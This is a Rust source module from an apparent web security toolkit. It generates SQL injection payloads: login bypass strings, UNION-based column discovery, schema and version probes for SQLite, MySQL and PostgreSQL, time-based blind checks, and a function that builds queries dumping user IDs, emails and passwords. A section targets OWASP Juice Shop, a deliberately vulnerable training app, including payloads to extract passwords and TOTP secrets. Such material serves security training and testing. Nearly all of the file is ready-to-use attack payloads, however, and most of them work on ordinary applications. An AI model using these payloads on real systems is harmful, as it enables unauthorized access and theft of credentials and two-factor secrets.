//! SQL Injection payload generation
//!
//! Provides common SQLi payloads for various attack scenarios.

/// SQL injection payload with description
#[derive(Debug, Clone)]
pub struct SqliPayload {
    pub name: String,
    pub payload: String,
    pub category: SqliCategory,
    pub database: DatabaseType,
}

#[derive(Debug, Clone, PartialEq)]
pub enum SqliCategory {
    AuthBypass,
    UnionBased,
    ErrorBased,
    BlindBoolean,
    BlindTime,
    Stacked,
}

#[derive(Debug, Clone, PartialEq)]
pub enum DatabaseType {
    Generic,
    Sqlite,
    Mysql,
    Postgresql,
    Mssql,
    Oracle,
}

impl SqliPayload {
    pub fn new(
        name: impl Into<String>,
        payload: impl Into<String>,
        category: SqliCategory,
        database: DatabaseType,
    ) -> Self {
        Self {
            name: name.into(),
            payload: payload.into(),
            category,
            database,
        }
    }
}

/// Authentication bypass payloads
pub fn auth_bypass_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "OR 1=1",
            "' OR 1=1--",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
        SqliPayload::new(
            "OR 1=1 (no quote)",
            "OR 1=1--",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
        SqliPayload::new(
            "OR true",
            "' OR 'a'='a",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
        SqliPayload::new(
            "Comment bypass",
            "admin'--",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
        SqliPayload::new(
            "Double dash space",
            "' OR 1=1-- -",
            SqliCategory::AuthBypass,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "Hash comment",
            "' OR 1=1#",
            SqliCategory::AuthBypass,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "Null byte",
            "' OR 1=1%00",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
    ]
}

/// Generate specific user login bypass
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::sqli::user_login_bypass;
///
/// let payload = user_login_bypass("admin@example.com");
/// assert_eq!(payload, "admin@example.com'--");
/// ```
pub fn user_login_bypass(email: &str) -> String {
    format!("{}'--", email)
}

/// Generate UNION-based SQLi payloads for column discovery
pub fn union_column_discovery(max_columns: usize) -> Vec<SqliPayload> {
    (1..=max_columns)
        .map(|n| {
            let nulls = (1..=n).map(|_| "NULL").collect::<Vec<_>>().join(",");
            SqliPayload::new(
                format!("{} columns", n),
                format!("' UNION SELECT {}--", nulls),
                SqliCategory::UnionBased,
                DatabaseType::Generic,
            )
        })
        .collect()
}

/// SQLite specific payloads
pub fn sqlite_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "Schema extraction",
            "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Table names",
            "')) UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "SQLite version",
            "')) UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
    ]
}

/// MySQL specific payloads
pub fn mysql_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "Information schema tables",
            "' UNION SELECT table_name,2,3 FROM information_schema.tables#",
            SqliCategory::UnionBased,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "Information schema columns",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'#",
            SqliCategory::UnionBased,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "MySQL version",
            "' UNION SELECT @@version,2,3#",
            SqliCategory::UnionBased,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "Current database",
            "' UNION SELECT database(),2,3#",
            SqliCategory::UnionBased,
            DatabaseType::Mysql,
        ),
        SqliPayload::new(
            "Time-based blind",
            "' AND SLEEP(5)#",
            SqliCategory::BlindTime,
            DatabaseType::Mysql,
        ),
    ]
}

/// PostgreSQL specific payloads
pub fn postgresql_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "PG version",
            "'; SELECT version()--",
            SqliCategory::UnionBased,
            DatabaseType::Postgresql,
        ),
        SqliPayload::new(
            "Current user",
            "'; SELECT current_user--",
            SqliCategory::UnionBased,
            DatabaseType::Postgresql,
        ),
        SqliPayload::new(
            "Table names",
            "' UNION SELECT table_name,null FROM information_schema.tables--",
            SqliCategory::UnionBased,
            DatabaseType::Postgresql,
        ),
        SqliPayload::new(
            "Time-based blind",
            "'; SELECT pg_sleep(5)--",
            SqliCategory::BlindTime,
            DatabaseType::Postgresql,
        ),
    ]
}

/// Generate user credentials extraction payload
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::sqli::extract_users_payload;
///
/// let payload = extract_users_payload(9);
/// assert!(payload.contains("UNION SELECT"));
/// assert!(payload.contains("FROM users"));
/// ```
pub fn extract_users_payload(num_columns: usize) -> String {
    let columns = match num_columns {
        n if n >= 9 => "id,email,password,4,5,6,7,8,9".to_string(),
        n if n >= 3 => {
            let padding: String = (4..=n).map(|i| format!(",{}", i)).collect();
            format!("id,email,password{}", padding)
        }
        _ => "id,email,password".to_string(),
    };
    format!("')) UNION SELECT {} FROM users--", columns)
}

/// Deleted records bypass (soft delete)
pub fn deleted_records_bypass() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "NULL deletedAt",
            "' OR deletedAt IS NOT NULL--",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
        SqliPayload::new(
            "Include deleted",
            "' OR 1=1 OR deletedAt IS NOT NULL--",
            SqliCategory::AuthBypass,
            DatabaseType::Generic,
        ),
    ]
}

/// Juice Shop specific SQLi payloads
pub fn juice_shop_sqli() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new(
            "Admin login",
            "' OR 1=1--",
            SqliCategory::AuthBypass,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Login as Jim",
            "jim@juice-sh.op'--",
            SqliCategory::AuthBypass,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Login as Bender",
            "bender@juice-sh.op'--",
            SqliCategory::AuthBypass,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Ghost login (deleted user)",
            "' OR deletedAt IS NOT NULL--",
            SqliCategory::AuthBypass,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Schema extraction",
            "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "User credentials",
            "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "TOTP secrets",
            "')) UNION SELECT id,email,totpSecret,4,5,6,7,8,9 FROM users--",
            SqliCategory::UnionBased,
            DatabaseType::Sqlite,
        ),
        SqliPayload::new(
            "Christmas special (deleted product)",
            "'))--",
            SqliCategory::AuthBypass,
            DatabaseType::Sqlite,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_auth_bypass_payloads() {
        let payloads = auth_bypass_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("OR 1=1")));
    }

    #[test]
    fn test_user_login_bypass() {
        let payload = user_login_bypass("admin@test.com");
        assert_eq!(payload, "admin@test.com'--");
    }

    #[test]
    fn test_union_column_discovery() {
        let payloads = union_column_discovery(5);
        assert_eq!(payloads.len(), 5);
        assert!(payloads[2].payload.contains("NULL,NULL,NULL"));
    }

    #[test]
    fn test_extract_users_payload() {
        let payload = extract_users_payload(9);
        assert!(payload.contains("id,email,password"));
        assert!(payload.contains("FROM users"));
    }

    #[test]
    fn test_juice_shop_sqli() {
        let payloads = juice_shop_sqli();
        assert!(payloads.iter().any(|p| p.name.contains("Admin login")));
        assert!(payloads.iter().any(|p| p.payload.contains("jim@juice-sh.op")));
    }
}
